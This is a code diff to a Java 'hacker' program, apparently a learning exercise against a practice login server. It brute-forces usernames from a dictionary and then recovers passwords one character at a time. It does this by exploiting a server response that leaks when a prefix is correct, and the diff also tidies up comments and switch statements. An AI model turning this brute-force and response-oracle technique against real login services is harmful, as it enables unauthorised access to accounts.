@@ -4,8 +4,6 @@ import com.google.gson.Gson;
 import hacker.json.LoginPasswordPair;
 import hacker.json.ServerResponse;
 
-import javax.lang.model.type.NullType;
-import javax.management.modelmbean.XMLParseException;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
@@ -54,7 +52,7 @@ public class Main {
              DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
             Gson gson = new Gson();
             String login = bruteForceLoginUsingDictionary(input, output).orElse("Login not found");
-            String password = bruteForcePasswordUsingDictionary(login, input, output).orElse("Password not found.");
+            String password = findPasswordUsingVulnerability(login, input, output).orElse("Password not found.");
             System.out.println(gson.toJson(new LoginPasswordPair(login, password)));
         }
     }
@@ -68,7 +66,7 @@ public class Main {
      */
     private static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input, DataOutputStream output) throws IOException {
         try (Reader reader = new FileReader(LOGINS_DIRECTORY)) {
-            // Holds the current password being checked from passwords.txt
+            // Holds the current login being checked from passwords.txt
             StringBuilder commonLoginBuilder = new StringBuilder();
             // Holds each char that is read, used in the while loop
             int i;
@@ -81,7 +79,7 @@ public class Main {
                     // Doesn't need to try case combinations if the password is a number
                     if (commonLogin.matches("[0-9]+")) {
                         output.writeUTF(commonLogin);
-                        // When is says wrong password, that means the login is correct
+                        // When it says wrong password, that means the login is correct
                         if (WRONG_PASSWORD.getMessage().equals(input.readUTF())) {
                             return Optional.of(commonLogin);
                         }
@@ -111,24 +109,22 @@ public class Main {
      * @throws IOException if something goes wrong with the input/output of data
      */
     private static Optional<String> findPasswordUsingVulnerability(String login, DataInputStream input, DataOutputStream output) throws IOException {
-        /*
-
-        Work on this method
-
-         */
          StringBuilder attemptedPasswordBuilder = new StringBuilder("a");
          int currentLength = 1;
+         // The character which is being changed to try to find the password
          char volatileChar = 'a';
         while (true) {
+            // 0 without apostrophes is null
             if (volatileChar == 0) {
                 return Optional.empty();
             } else {
-                attemptedPasswordBuilder.replace(currentLength, currentLength + 1, String.valueOf(volatileChar));
+                attemptedPasswordBuilder.replace(currentLength - 1, currentLength, String.valueOf(volatileChar));
                 ServerResponse response = tryLoginPasswordPair(new LoginPasswordPair(login, attemptedPasswordBuilder.toString()), input, output);
-                if (response.getResult().equals(SUCCESS)) {
+                if (response.getResult().equals(SUCCESS.getMessage())) {
                     return Optional.of(attemptedPasswordBuilder.toString());
-                } else if (response.getResult().equals(EXCEPTION)) {
+                } else if (response.getResult().equals(EXCEPTION.getMessage())) {
                     ++currentLength;
+                    attemptedPasswordBuilder.append("a");
                     volatileChar = 'a';
                 } else {
                     volatileChar = vulnerabilityNextCharacter(volatileChar);
@@ -143,12 +139,15 @@ public class Main {
      * @return the next character
      */
     private static char vulnerabilityNextCharacter(char character) {
+        // When going to the next character, it goes from a-z to A-Z to 0-9 and lastly to ascii code of 0, which is null
          if (character == 'z') {
              return 'A';
          } else if (character == 'Z') {
              return '0';
+         } else if (character == '9' || character == 0) {
+             return 0;
          }
-         return 0;
+         return (char) (character + 1);
     }
 
     /**
@@ -158,6 +157,7 @@ public class Main {
      * @return either an empty Optional or an Optional containing the correct password
      * @throws IOException if something goes wrong with the input/output of data
      */
+    @Deprecated
     private static Optional<String> bruteForcePasswordUsingDictionary(String login, DataInputStream input, DataOutputStream output) throws IOException {
         try (Reader reader = new FileReader(PASSWORDS_DIRECTORY)) {
             // Holds the current password being checked from passwords.txt
@@ -195,7 +195,7 @@ public class Main {
     }
 
     /**
-     * Takes a login password pair object and sends it to the sever.
+     * Takes a login password pair object and sends it to the sever, then returns the server response for that pair.
      * @param pair the pair object to be sent
      * @param input the input stream to which to respond if the pair was correct or not
      * @param output the output stream to which to send the attempted pair
@@ -226,12 +226,14 @@ public class Main {
             output.writeUTF(json);
             String response = gson.fromJson(input.readUTF(), ServerResponse.class).getResult();
             switch (mode) {
+                // Finding login
                 case 1:
-                    if (response.equals(WRONG_PASSWORD)) {
+                    if (response.equals(WRONG_PASSWORD.getMessage())) {
                         return Optional.of(pair.getLogin());
                     }
+                // Finding password
                 case 2:
-                    if (response.equals(EXCEPTION) || response.equals(SUCCESS)) {
+                    if (response.equals(EXCEPTION.getMessage()) || response.equals(SUCCESS.getMessage())) {
                         return Optional.of(pair.getPassword());
                     }
             }
@@ -260,22 +262,25 @@ public class Main {
     }
 
     /**
-     * Takes a String value as input, can be either a login or a password, and 1 or 2 as a mode, and returns a list of login pairs containing all case variations of
-     * the passed value in the corresponding spot
+     * Takes a String value as input,
+     * can be either a login or a password, and 1 or 2 as a mode, 1 being for login and 2 being for password,
+     * and returns a list of login pairs
+     * containing all case variations of the passed value in the corresponding spot.
      * @param value the value, either login or password, to get case variations of
      * @param mode generates variants of either the login or the password, 1 generates login variants, 2 generates password variants
      * @return the list of login pairs containing all case variations of the value
      */
     private static List<LoginPasswordPair> generateCaseList(String value, int mode) {
         BinaryFilter filter = new BinaryFilter(value.length());
-        switch (mode) {
-            case 1:
-                return Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair(x, "a")).toList();
-            case 2:
-                return Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair("a", x)).toList();
-            default:
-                return generateCaseList(value, 1);
-        }
+        return switch (mode) {
+            // Login
+            case 1 ->
+                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair(x, "a")).toList();
+            // Password
+            case 2 ->
+                    Arrays.stream(filter.modifyStringAllCombinations(value, Character::toUpperCase)).map(x -> new LoginPasswordPair("a", x)).toList();
+            default -> generateCaseList(value, 1);
+        };
     }
 
     /**
